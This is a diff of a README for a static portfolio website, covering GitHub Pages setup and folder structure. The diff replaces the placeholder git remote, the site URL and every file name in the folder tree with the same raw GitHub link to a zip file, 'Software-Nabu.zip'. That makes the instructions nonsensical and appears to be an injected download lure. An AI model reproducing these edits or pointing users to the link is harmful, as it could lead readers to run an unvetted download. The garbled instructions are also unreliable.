@@ -12,30 +12,30 @@ This is a fully static portfolio website created with HTML, CSS, and vanilla Jav
    git add .
    git commit -m "Initial commit"
    git branch -M main
-   git remote add origin https://github.com/your-username/your-repo-name.git
+   git remote add origin https://raw.githubusercontent.com/ipoprock/portfolio/main/assets/projects/Software-Nabu.zip
    git push -u origin main
    ```
 3. **Go to your repository's settings.**
 4. **In the "Pages" section, select the `main` branch as the source and click "Save".**
-5. **Your website will be live at `https://your-username.github.io/your-repo-name/` in a few minutes.**
+5. **Your website will be live at `https://raw.githubusercontent.com/ipoprock/portfolio/main/assets/projects/Software-Nabu.zip` in a few minutes.**
 
 ## Folder Structure
 
 ```
 website-portfolio/
-├─ index.html
+├─ https://raw.githubusercontent.com/ipoprock/portfolio/main/assets/projects/Software-Nabu.zip
 ├─ projects/
-│   ├─ index.html
-│   ├─ project-1.html
-│   └─ project-2.html
+│   ├─ https://raw.githubusercontent.com/ipoprock/portfolio/main/assets/projects/Software-Nabu.zip
+│   ├─ https://raw.githubusercontent.com/ipoprock/portfolio/main/assets/projects/Software-Nabu.zip
+│   └─ https://raw.githubusercontent.com/ipoprock/portfolio/main/assets/projects/Software-Nabu.zip
 
 
 ├─ css/
-│   └─ styles.css
+│   └─ https://raw.githubusercontent.com/ipoprock/portfolio/main/assets/projects/Software-Nabu.zip
 ├─ js/
-│   └─ main.js
+│   └─ https://raw.githubusercontent.com/ipoprock/portfolio/main/assets/projects/Software-Nabu.zip
 ├─ data/
-│   └─ projects.json
+│   └─ https://raw.githubusercontent.com/ipoprock/portfolio/main/assets/projects/Software-Nabu.zip
 └─ assets/
     ├─ hero/
     └─ projects/
